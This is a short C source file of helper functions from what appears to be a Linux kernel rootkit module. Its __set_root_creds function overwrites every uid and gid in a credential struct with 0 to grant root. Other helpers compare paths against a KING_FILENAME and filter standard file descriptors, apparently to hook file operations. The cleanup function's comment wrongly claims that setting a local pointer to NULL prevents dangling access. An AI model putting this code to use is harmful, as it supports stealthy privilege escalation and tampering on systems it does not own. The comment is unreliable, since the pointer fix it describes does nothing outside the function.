#include <linux/kernel.h>
#include <linux/file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/slab.h>

/* Cleanup fops struct*/
static void cleanup_fops(struct file_operations *fops) {
    kfree(fops); 
    fops = NULL; // prevent dangling pointer access
}

/* Checks if path doesn't match KING_FILENAME and return immediately*/
static long is_bad_path(const char *full_path, const char *target, size_t n) {
    if (strncmp(full_path, target, n) != 0) {
        return 1;
    }
    return 0;
}

/* Checks if file descriptor (fd) is standard (STDOUT, STDERR, STDIN)*/
static long is_bad_fd(const int fd) {
    if (fd < 3) { // 0, 1, 2
        return 1;
    }
    return 0;
}

/* Set given credentials to root (does not commit creds for you!) */
void __set_root_creds(struct cred *cred) {
    cred->uid.val = cred->gid.val = 0;
    cred->euid.val = cred->egid.val = 0;
    cred->suid.val = cred->sgid.val = 0;
    cred->fsuid.val = cred->fsgid.val = 0;
}